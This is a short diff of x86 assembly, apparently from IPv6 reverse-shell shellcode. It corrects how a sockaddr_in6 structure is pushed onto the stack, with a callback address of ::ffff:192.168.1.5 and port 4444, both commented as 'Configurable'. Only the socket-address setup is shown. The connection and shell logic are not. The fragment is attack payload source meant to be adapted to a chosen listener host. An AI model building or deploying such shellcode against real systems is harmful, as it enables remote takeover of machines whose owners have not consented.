@@ -33,8 +33,8 @@ push DWORD 0x0501a8c0
 push word 0xffff
 push DWORD eax
 push DWORD eax
-push DWORD eax		      ;inet_pton(AF_INET6, "::ffff:192.168.1.5", &srvaddr.sin6_addr)| Configurable |
-push eax              ;sin6_flowinfo
+push WORD ax		  ;inet_pton(AF_INET6, "::ffff:192.168.1.5", &srvaddr.sin6_addr)| Configurable |
+push DWORD eax        ;sin6_flowinfo
 push WORD 0x5c11      ;sin6_port=4444 | 0x5c11 | Configurable |
 push WORD 0x0a        ;AF_INET6
 mov ecx,esp           ;ECX holds pointer to struct sockaddr_in6
